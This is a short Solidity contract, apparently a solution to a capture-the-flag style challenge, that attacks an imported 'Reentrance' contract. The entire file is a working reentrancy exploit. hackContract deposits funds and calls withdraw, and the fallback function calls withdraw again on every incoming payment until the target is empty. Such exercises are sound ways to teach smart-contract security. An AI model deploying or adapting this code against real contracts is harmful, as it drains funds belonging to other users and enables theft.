// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Reentrance.sol";

contract AttackingReentrance {
    address payable public contractAddress;
    Reentrance public reentrance;


    constructor(address payable _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        uint bal = address(this).balance;
        address addy = address(this);
        Reentrance(contractAddress).donate{value: bal}(addy);
        Reentrance(contractAddress).withdraw();
    }

    fallback() external payable {
        if (contractAddress.balance >= 1 ) {
            Reentrance(contractAddress).withdraw();
        }
    }

}